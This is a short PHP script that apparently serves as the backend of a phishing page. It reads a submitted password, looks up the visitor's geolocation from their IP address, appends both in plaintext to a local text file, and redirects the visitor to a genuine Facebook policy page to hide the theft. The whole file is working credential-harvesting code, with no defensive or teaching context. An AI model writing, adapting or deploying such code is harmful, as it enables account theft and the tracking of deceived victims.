<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the user's IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Get the password from the form
    $password = $_POST["pass"];

    // Make a request to the ipinfo.io API using cURL
    $url = "https://ipinfo.io/{$user_ip}/json";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "cURL Error: " . curl_error($ch);
    } else {
        // Parse the JSON response
        $data = json_decode($response);

        // Extract geolocation information
        $ip = $data->ip;
        $city = $data->city;
        $region = $data->region;
        $country = $data->country;
        $location = $data->loc;

        // Save the user's IP address and password to a text file
        $geolocation_data = "IP: $ip\nCity: $city\nRegion: $region\nCountry: $country\nLocation (Latitude, Longitude): $location\n";
        $password_data = "Password: $password\n";

        // Open a text file for appending
        $file = fopen("user_data.txt", "a");

        // Write the geolocation data to the file
        fwrite($file, $geolocation_data . PHP_EOL);

        // Write the password data to the file
        fwrite($file, $password_data . PHP_EOL);

        // Close the file
        fclose($file);

        // Redirect or perform other actions as needed
        // For example, you can redirect the user to a success page
        header("Location: https://transparency.fb.com/en-gb/policies/");
        exit();
    }

    curl_close($ch);
}
?>
